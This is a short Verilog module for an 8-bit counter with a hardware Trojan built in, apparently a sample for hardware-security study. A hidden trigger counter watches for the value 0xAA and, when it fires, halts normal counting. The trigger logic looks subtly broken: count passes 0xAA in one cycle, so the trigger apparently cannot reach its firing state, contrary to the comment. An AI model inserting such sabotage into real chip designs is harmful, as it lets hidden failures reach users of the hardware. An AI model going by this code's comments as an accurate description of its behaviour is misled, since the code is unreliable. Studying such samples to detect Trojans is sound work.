module counter8(input clk, input rst_n, input en, output reg [7:0] count);
  reg [1:0] trojan_cnt;
  wire trojan_fire = (trojan_cnt == 2'b11);

  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      count <= 0;
      trojan_cnt <= 2'b00;
    end else begin
      // Trojan sequential counter: advances when count==8'hAA and en is high
      if (count == 8'hAA && en && !trojan_fire)
        trojan_cnt <= trojan_cnt + 1;
      else if (!en || count != 8'hAA)
        trojan_cnt <= 2'b00;

      // Normal counter operation, suppressed when Trojan fires
      if (en && !trojan_fire)
        count <= count + 1;
    end
  end
endmodule